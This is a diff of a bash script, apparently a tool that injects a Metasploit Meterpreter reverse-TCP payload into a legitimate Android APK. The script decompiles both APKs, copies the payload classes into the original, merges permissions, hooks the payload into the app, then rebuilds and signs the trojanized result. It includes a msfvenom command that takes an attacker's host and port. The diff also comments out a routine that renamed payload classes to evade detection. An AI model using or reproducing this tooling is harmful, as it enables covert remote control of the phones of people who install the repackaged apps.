@@ -12,49 +12,49 @@ if ! [ -d "$(pwd)/logs" ]; then
 fi
 logfile="./logs/metapk-`date +%s`.log"
 
-rand_name(){
-        echo $(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-        }
+#rand_name(){
+#       echo $(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
+#        }
 
-obfuscate(){
-	if [ "$1" == "" ]; then
-	new_mainact=$(rand_name)
-	new_payload=$(rand_name)
-	new_mainbroad=$(rand_name)
-	new_mainserv=$(rand_name)
-	new_met=$(rand_name)
-	new_stage=$(rand_name)
-	mv original/smali/com/metasploit original/smali/com/$new_met
-	mv original/smali/com/$new_met/stage original/smali/com/$new_met/$new_stage
-	return
-fi
-if [ ! -z $2 ]; then
-		fn=$2
-fi
-for i in $1/*	
-        do
-                if [ -d $i ]; then
-                        obfuscate $i
-                        return
-                fi
-                sed -i 's/metasploit/'$new_met'/g' $i
-                sed -i 's/stage/'$new_stage'/g' $i                
-                declare -A smalis=( [MainActivity]=$new_mainact [MainBroadcastReceiver]=$new_mainbroad [MainService]=$new_mainserv [Payload]=$new_payload )
-                for j in MainActivity MainBroadcastReceiver MainService Payload; do
-                        key=$(echo ${smalis[$j]})
-                if [ -z $fn ]; then                        
-                        [ -z "$(cat $i | grep -i $j)" ] || {
-                                sed -i 's/'$j'/'$key'/g' $i
-                        }
-                else
-                if [ $(basename $i | sed 's/\..*//') == $j ]; then
-                        mv $i $1/$key.smali
-                        continue
-                fi
-                fi
-done
-done
-}
+#obfuscate(){
+#	if [ "$1" == "" ]; then
+#	new_mainact=$(rand_name)
+#	new_payload=$(rand_name)
+#	new_mainbroad=$(rand_name)
+#	new_mainserv=$(rand_name)
+#	new_met=$(rand_name)
+#	new_stage=$(rand_name)
+#	mv original/smali/com/metasploit original/smali/com/$new_met
+#	mv original/smali/com/$new_met/stage original/smali/com/$new_met/$new_stage
+#	return
+#fi
+#if [ ! -z $2 ]; then
+#		fn=$2
+#fi
+#for i in $1/*	
+#        do
+#                if [ -d $i ]; then
+#                        obfuscate $i
+#                        return
+#                fi
+#                sed -i 's/metasploit/'$new_met'/g' $i
+#                sed -i 's/stage/'$new_stage'/g' $i                
+#                declare -A smalis=( [MainActivity]=$new_mainact [MainBroadcastReceiver]=$new_mainbroad [MainService]=$new_mainserv [Payload]=$new_payload )
+#                for j in MainActivity MainBroadcastReceiver MainService Payload; do
+#                        key=$(echo ${smalis[$j]})
+#                if [ -z $fn ]; then                        
+#                        [ -z "$(cat $i | grep -i $j)" ] || {
+#                                sed -i 's/'$j'/'$key'/g' $i
+#                        }
+#                else
+#                if [ $(basename $i | sed 's/\..*//') == $j ]; then
+#                        mv $i $1/$key.smali
+#                        continue
+#                fi
+#                fi
+#done
+#done
+#}
 
 cleanup(){
 	echo -n "+ Cleaning Up"
@@ -64,41 +64,6 @@ cleanup(){
 	rm -rf original/
 	rm -rf payload/
 	echo " ==> Done"
-}
-
-manifest(){
-	x=$(grep -n -w uses-permission original/AndroidManifest.xml)
-        while [ $(wc -l <<<$x) != 1 ]; do
-        x=$(sed '1d' <<<$x)
-        done
-        x=$(sed 's/:.*//' <<<$x)
-        x=$(($x+1))
-        cat payload/AndroidManifest.xml | grep uses-permission > manifest
-        while read -r i || [[ -n $i ]]; do
-                sed -i ''$x'i'"\    $i"'' original/AndroidManifest.xml
-                x=$((x+1))
-        done < manifest
-        rm manifest
-	embed
-	sign
-	xcode=$?
-	if [ "$xcode" != "0" ]; then
-		if [ "$hok" == "1" ]; then
-			excode=0
-		embed hook
-		sign
-	fi
-	if [ "$xcode" != "0" ]; then
-		if ! [ -z "$(grep -w v15 $logfile)" ]; then
-			excode=0
-		embed fallback
-		sign
-	fi
-	fi	
-fi
-error_handler
-
-
 }
 
 error_handler(){
@@ -154,6 +119,63 @@ browse_smali(){
 			fi
         fi
 done
+}
+
+decompile(){
+	echo -n "+ Decompiling Original Apk"
+	./bin/apktool empty-framework-dir --force >> $logfile 2>&1
+	./bin/apktool d --only-main-classes -f -o original $1 >> $logfile 2>&1
+	echo " ==> Done"
+	shift
+	echo -n "+ Decompiling Payload"
+	./bin/apktool d -f -o payload $1 >> $logfile 2>&1
+	echo " ==> Done"
+	cp_payload
+}
+
+cp_payload(){
+	cp -r payload/smali/com/metasploit original/smali/com
+	#echo -n "+ Obfuscating Smali Files"
+	#obfuscate
+	#obfuscate original/smali/com/$new_met/$new_stage
+	#echo " ==> I Tried My Best"
+	#obfuscate original/smali/com/$new_met/$new_stage
+	manifest
+}
+
+manifest(){
+	x=$(grep -n -w uses-permission original/AndroidManifest.xml)
+        while [ $(wc -l <<<$x) != 1 ]; do
+        x=$(sed '1d' <<<$x)
+        done
+        x=$(sed 's/:.*//' <<<$x)
+        x=$(($x+1))
+        cat payload/AndroidManifest.xml | grep uses-permission > manifest
+        while read -r i || [[ -n $i ]]; do
+                sed -i ''$x'i'"\    $i"'' original/AndroidManifest.xml
+                x=$((x+1))
+        done < manifest
+        rm manifest
+	embed
+	sign
+	xcode=$?
+	if [ "$xcode" != "0" ]; then
+		if [ "$hok" == "1" ]; then
+			excode=0
+		embed hook
+		sign
+	fi
+	if [ "$xcode" != "0" ]; then
+		if ! [ -z "$(grep -w v15 $logfile)" ]; then
+			excode=0
+		embed fallback
+		sign
+	fi
+	fi	
+fi
+error_handler
+
+
 }
 
 embed(){
@@ -224,6 +246,25 @@ else echo "> Could Not Find Smali File To Inject Hook, See $logfile For Details"
         fi
 }
 
+sign(){
+echo -n "+ Building Original Apk"
+ ./bin/apktool b original/ >> $logfile 2>&1
+
+	if [ "$?" != "0" ]; then
+		excode=1
+		return 1
+	fi
+	echo " ==> Done"
+echo -n "+ Signing Original Apk"
+jarsigner -verbose -keystore ./bin/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA original/dist/*.apk androiddebugkey >>$logfile 2>&1
+	if ! [ -d $(pwd)/output ]; then
+		mkdir $(pwd)/output
+	fi
+cp original/dist/*.apk output/
+echo " ==> Done"
+cleanup
+}
+
 manual_hook(){
 	echo "+++ Looking For Injectable Smali Files"
 	ls original  | grep smali > smali_folders
@@ -240,46 +281,6 @@ manual_hook(){
 	embed "manual"
 }
 
-sign(){
-echo -n "+ Building Original Apk"
- ./bin/apktool b original/ >> $logfile 2>&1
-
-	if [ "$?" != "0" ]; then
-		excode=1
-		return 1
-	fi
-	echo " ==> Done"
-echo -n "+ Signing Original Apk"
-jarsigner -verbose -keystore ./bin/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA original/dist/*.apk androiddebugkey >>$logfile
-	if ! [ -d $(pwd)/output ]; then
-		mkdir $(pwd)/output
-	fi
-cp original/dist/*.apk output/
-echo " ==> Done"
-cleanup
-}
-
-cp_payload(){
-	cp -r payload/smali/com/metasploit original/smali/com
-	echo -n "+ Obfuscating Smali Files"
-	obfuscate
-	obfuscate original/smali/com/$new_met/$new_stage
-	echo " ==> I Tried My Best"
-	obfuscate original/smali/com/$new_met/$new_stage
-	manifest
-}
-
-decompile(){
-	echo -n "+ Decompiling Original Apk"
-	./bin/apktool empty-framework-dir --force >> $logfile 2>&1
-	./bin/apktool d -f -o original $1 >> $logfile 2>&1
-	echo " ==> Done"
-	shift
-	echo -n "+ Decompiling Payload"
-	./bin/apktool d -f -o payload $1 >> $logfile 2>&1
-	echo " ==> Done"
-	cp_payload
-}
 
 create(){
 	msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=$1 lport=$2 -o backdoor.apk
